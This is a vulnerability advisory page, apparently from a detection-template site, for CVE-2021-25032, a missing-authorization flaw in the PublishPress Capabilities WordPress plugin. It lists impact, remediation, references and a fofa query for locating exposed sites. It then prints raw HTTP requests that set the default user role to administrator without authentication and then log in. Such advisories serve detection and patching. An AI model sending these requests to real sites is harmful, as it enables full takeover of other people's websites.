---
layout: post
cve_id: CVE-2021-25032
title: PublishPress Capabilities < 2.3.1 - Missing Authorization
pcap: true
pcap_path: /pcaps/2021/CVE-2021-25032.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-25032.yaml
snort2_rule: N/A
snort3_rule: N/A
author: ritikchaddha
severity: critical
impact: 'Unauthenticated attackers can update arbitrary WordPress options including
  setting the default user role to administrator, leading to complete site compromise
  through privilege escalation.

  '
remediation: 'Update the PublishPress Capabilities plugin to version 2.3.1 or later.

  '
reference:
- https://wpscan.com/vulnerability/2f0f1a32-0c7a-48e6-8617-e0b2dcf62727/
- https://plugins.trac.wordpress.org/changeset/2640161
- https://nvd.nist.gov/vuln/detail/CVE-2021-25032
- https://github.com/RandomRobbieBF/CVE-2021-25032
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2021-25032
  cwe-id: CWE-352
  epss-score: 0.81889
  epss-percentile: 0.99163
  cpe: cpe:2.3:a:publishpress:capabilities:*:*:*:*:-:wordpress:*:*
metadata:
  verified: true
  max-request: 3
  vendor: publishpress
  product: capabilities
  framework: wordpress
  fofa-query: body="/wp-content/plugins/capability-manager-enhanced"
tags:
- wpscan
- cve
- cve2021
- wordpress
- wp-plugin
- wp
- capability-manager-enhanced
- authenticated
- vkev
- vuln
---

## ðŸ” Vulnerability Description
The PublishPress Capabilities plugin for WordPress before 2.3.1 does not have proper authorization and CSRF checks when updating settings via the init hook, allowing unauthenticated attackers to update arbitrary blog options, such as setting the default role to administrator.


## ðŸŒ HTTP Request
```nohighlight
POST /wp-admin/admin.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
Connection: close
Content-Length: 81
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

page=pp-capabilities-settings&all_options=default_role&default_role=administrator
```

```nohighlight
POST /wp-login.php?redirect_to=http%3A%2F%2Fwww.victim.com%2Fwp-admin%2Foptions-general.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Connection: close
Content-Length: 38
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

log=gTRNSo&pwd=ktjE7N&wp-submit=Log+In
```

```nohighlight
GET /wp-admin/admin.php?page=pp-capabilities HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.5.20) Gecko/ Firefox/3.6.15
Connection: close
Accept-Encoding: gzip
```

